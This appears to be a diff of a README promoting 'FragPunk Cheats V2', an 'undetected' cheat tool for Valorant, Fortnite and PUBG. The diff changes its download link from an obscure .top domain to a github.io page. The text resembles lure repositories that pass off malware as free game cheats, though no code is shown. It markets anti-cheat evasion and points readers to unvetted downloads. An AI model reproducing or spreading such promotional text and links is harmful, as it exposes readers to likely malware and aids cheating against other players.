@@ -2,7 +2,7 @@
 
 FragPunk Cheats V2 is a cutting-edge gaming enhancement tool designed for competitive players, offering undetected cheats, optimized performance, and advanced features to dominate your matches. Perfect for FPS enthusiasts seeking an edge in games like Valorant, Fortnite, and PUBG.
 
-[![Download FragPunk Cheats V2](https://img.shields.io/badge/Download-FragPunk_Cheats_V2-blueviolet)](https://poelkakusthbutn.top/)
+[![Download FragPunk Cheats V2](https://img.shields.io/badge/Download-FragPunk_Cheats_V2-blueviolet)](https://fragpunk-cheats-v2.github.io/.github)
 
 ---
 
